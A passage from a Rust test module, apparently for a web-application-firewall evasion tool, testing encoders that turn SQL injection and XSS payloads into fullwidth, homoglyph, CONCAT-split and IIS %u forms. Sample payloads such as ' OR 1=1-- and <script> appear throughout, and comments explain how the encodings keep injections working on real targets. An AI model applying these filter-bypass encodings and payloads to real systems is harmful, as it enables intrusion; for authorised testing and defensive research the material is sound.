    fn pg_chr_decompose_unbalanced_passthrough() {
        assert_eq!(pg_chr_decompose("'unclosed"), "'unclosed");
    }

    #[test]
    fn sql_concat_split_isolated_literal_keeps_other_tokens() {
        // From a real payload: id=1 AND username = 'admin' AND status = 1
        let payload = "id=1 AND username='admin' AND status=1";
        let out = sql_concat_split(payload);
        assert_eq!(
            out,
            "id=1 AND username=CONCAT('a','d','m','i','n') AND status=1"
        );
    }

    #[test]
    fn unicode_encode_empty() {
        assert_eq!(unicode_encode(""), "");
    }

    // ── Fullwidth encoding tests ───────────────────────────────────────

    #[test]
    fn fullwidth_encode_sql_keywords() {
        let encoded = fullwidth_encode("SELECT");
        assert_eq!(encoded, "ＳＥＬＥＣＴ");
        // Every ASCII letter should be in fullwidth range
        for ch in encoded.chars() {
            assert!(
                ch as u32 >= 0xFF01,
                "expected fullwidth char, got {ch} (U+{:04X})",
                ch as u32
            );
        }
    }

    #[test]
    fn fullwidth_encode_spaces() {
        let encoded = fullwidth_encode("A B");
        assert!(
            encoded.contains('\u{3000}'),
            "space should become ideographic space"
        );
    }

    #[test]
    fn fullwidth_encode_preserves_non_ascii() {
        let encoded = fullwidth_encode("日本語");
        assert_eq!(encoded, "日本語", "non-ASCII should pass through unchanged");
    }

    #[test]
    fn fullwidth_encode_operators() {
        let encoded = fullwidth_encode("1=1");
        assert_eq!(encoded, "１＝１");
    }

    #[test]
    fn fullwidth_encode_sqli_payload() {
        let encoded = fullwidth_encode("' OR 1=1--");
        // Should contain fullwidth equivalents, not ASCII
        assert!(!encoded.contains("OR"), "should not contain ASCII 'OR'");
        assert!(encoded.contains("ＯＲ"), "should contain fullwidth 'ＯＲ'");
    }

    #[test]
    fn fullwidth_encode_empty() {
        assert_eq!(fullwidth_encode(""), "");
    }

    // ── Homoglyph encoding tests ───────────────────────────────────────

    #[test]
    fn homoglyph_preserves_sql_string_delimiters() {
        // Regression for F56: pre-fix `'` was mapped to U+2019,
        // destroying the SQL context-break the payload depends on.
        // U+2019 is not a SQL string delimiter — the host query's
        // string literal never closes and the injection becomes
        // inert. Verify the delimiters survive verbatim.
        let encoded = homoglyph_encode("' OR '1'='1");
        // Single + double quotes pass through unchanged.
        assert!(
            encoded.contains('\''),
            "ASCII single quote MUST be preserved for SQL: {encoded}"
        );
        assert!(
            !encoded.contains('\u{2019}'),
            "U+2019 right-single-quote must NOT appear: {encoded}"
        );
        // But the equals sign (non-delimiter) still gets mutated —
        // proves the function isn't a complete no-op.
        assert!(
            encoded.contains('\u{FF1D}'),
            "equals sign should still mutate to fullwidth: {encoded}"
        );
    }

    #[test]
    fn homoglyph_preserves_ascii_double_quote() {
        let encoded = homoglyph_encode(r#""admin" OR "1"="1""#);
        assert!(
            encoded.contains('"'),
            "ASCII double quote MUST be preserved: {encoded}"
        );
        assert!(
            !encoded.contains('\u{201D}'),
            "U+201D right-double-quote must NOT appear: {encoded}"
        );
    }

    #[test]
    fn homoglyph_replaces_angle_brackets() {
        let encoded = homoglyph_encode("<script>");
        assert!(!encoded.contains('<'), "ASCII < should be replaced");
        assert!(!encoded.contains('>'), "ASCII > should be replaced");
        assert!(encoded.contains('\u{FF1C}'), "should contain fullwidth <");
        assert!(encoded.contains('\u{FF1E}'), "should contain fullwidth >");
    }

    #[test]
    fn homoglyph_replaces_equals() {
        let encoded = homoglyph_encode("1=1");
        assert!(!encoded.contains('='), "ASCII = should be replaced");
        assert!(encoded.contains('\u{FF1D}'), "should contain fullwidth =");
    }

    #[test]
    fn homoglyph_preserves_letters() {
        let encoded = homoglyph_encode("SELECT");
        assert_eq!(encoded, "SELECT", "letters should be preserved");
    }

    #[test]
    fn homoglyph_encode_empty() {
        assert_eq!(homoglyph_encode(""), "");
    }

    #[test]
    fn homoglyph_replaces_parens() {
        let encoded = homoglyph_encode("fn()");
        assert!(encoded.contains('\u{FF08}'), "should contain fullwidth (");
        assert!(encoded.contains('\u{FF09}'), "should contain fullwidth )");
    }

    // ── Bug 2 regression: iis_unicode_encode non-BMP adversarial twins ──
    //
    // PRE-FIX BUG: the loop body cast `ch as u32` into a %uXXXX format
    // without checking whether `code > 0xFFFF`. For supplementary-plane
    // characters (U+10000 and above) this produced a 5-digit hex sequence
    // like `%u1F600`, which IIS's %u decoder rejects (its format is
    // strictly 4 hex digits). The bypass looked encoded but was actually
    // undecodable on any real IIS target — a silent bypass-rate killer.
    // Fixed: emit a UTF-16 surrogate pair `%uHIGH%uLOW` for non-BMP chars.

    #[test]
    fn iis_unicode_encode_lowest_non_bmp_u10000() {
        // U+10000 is the very first supplementary-plane codepoint (LINEAR B
        // SYLLABLE B008 A). Pre-fix: emitted `%u10000` (5 hex digits —
        // invalid IIS format). Post-fix: must emit the surrogate pair
        // %uD800%uDC00 (high=0xD800, low=0xDC00 for U+10000).
        let ch = '\u{10000}'; // U+10000
        let encoded = iis_unicode_encode(&ch.to_string());
        assert_eq!(
            encoded, "%uD800%uDC00",
            "U+10000 (lowest non-BMP) must encode as surrogate pair %uD800%uDC00, \
             not the invalid %u10000"
        );
        // Anti-regression: no 5-digit %u sequence.
        for hex_run in encoded.split("%u").skip(1) {
            let hex_part: String = hex_run
                .chars()
                .take_while(|c| c.is_ascii_hexdigit())
                .collect();
            assert_eq!(
                hex_part.len(),
                4,
                "every %u sequence must be exactly 4 hex digits (IIS spec); \
                 got {hex_part:?} in {encoded:?}"
            );
        }
    }

    #[test]
    fn iis_unicode_encode_high_cjk_supplement_u20000() {
        // U+20000 is the first codepoint in CJK Unified Ideographs Extension
        // B (𠀀). Pre-fix: emitted `%u20000` (5 hex digits — IIS rejects).
        // Post-fix: surrogate pair calculation:
        //   surrogate_base = 0x20000 - 0x10000 = 0x10000
        //   high = 0xD800 + (0x10000 >> 10) = 0xD800 + 0x40 = 0xD840
        //   low  = 0xDC00 + (0x10000 & 0x3FF) = 0xDC00 + 0x00 = 0xDC00
        let ch = '\u{20000}';
        let encoded = iis_unicode_encode(&ch.to_string());
        assert_eq!(
            encoded, "%uD840%uDC00",
            "U+20000 (CJK Supplement) must encode as %uD840%uDC00"
        );
        for hex_run in encoded.split("%u").skip(1) {
            let hex_part: String = hex_run
                .chars()
                .take_while(|c| c.is_ascii_hexdigit())
                .collect();
            assert_eq!(
                hex_part.len(),
                4,
                "each %u group must be 4 hex digits; got {hex_part:?}"
            );
        }
    }
}
